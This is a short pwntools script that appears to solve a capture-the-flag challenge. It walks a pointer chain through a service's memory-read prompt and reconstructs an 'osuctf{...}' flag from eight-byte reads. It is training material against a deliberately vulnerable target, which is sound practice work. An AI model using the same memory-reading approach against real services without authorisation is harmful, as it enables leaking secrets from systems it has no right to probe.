from pwn import *

context.log_level = "DEBUG"

io = remote('pointers.pwn.osucyber.club', 13393)
# Grab the starting address for the pointers
io.recvuntil(b'Here\'s a good starting point: ')
address = io.recvline()[:-1]

# Iterate through the addresses of each of the pointers, finding the next one each time
for i in range(8):
    io.recvuntil(b'> ')
    io.send(address+b'\n')
    io.recvuntil(b'] = ')
    address = io.recvline()[:-1]

# The flag could be in ~40 bytes of memory, but we'll read the next 80 to be sure we get it all. 
# As long as it has osuctf{}, we're on the right track.
flag = b''
flag_address = int(address, 16)
for i in range(10):
    io.recvuntil(b'> ')
    io.send(hex(flag_address+8*i)+'\n')
    io.recvuntil(b'] = ')
    contents = io.recvline()[:-1]
    flag += p64(int(contents, 16))
io.close()

flag = flag.decode()
flag = flag[:flag.find('}')+1]

print(flag)
